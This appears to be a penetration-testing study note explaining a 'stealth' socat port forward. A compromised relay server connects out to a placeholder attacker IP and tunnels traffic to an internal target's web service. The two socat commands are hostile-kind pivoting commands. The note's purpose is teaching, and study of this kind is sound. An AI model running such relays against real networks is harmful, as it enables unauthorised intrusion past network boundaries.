# ⭕ Socat Stealth Port Forward

### **Port Forwarding - Stealth**

We can also port forward, but without opening any ports on the server!

First of all, on our own attacking machine, we issue the following command:

```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

Next, on the compromised relay server we execute this command:

```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

&#x20;This would create a link between port 8000 on our attacking machine, and port 80 on the intended target , meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

* The request goes to `127.0.0.1:8000`
* Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
* Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

* The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
* Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

### Close Connections

&#x20;Run the `jobs` command in your terminal, then kill any socat processes using `kill %NUMBER.`
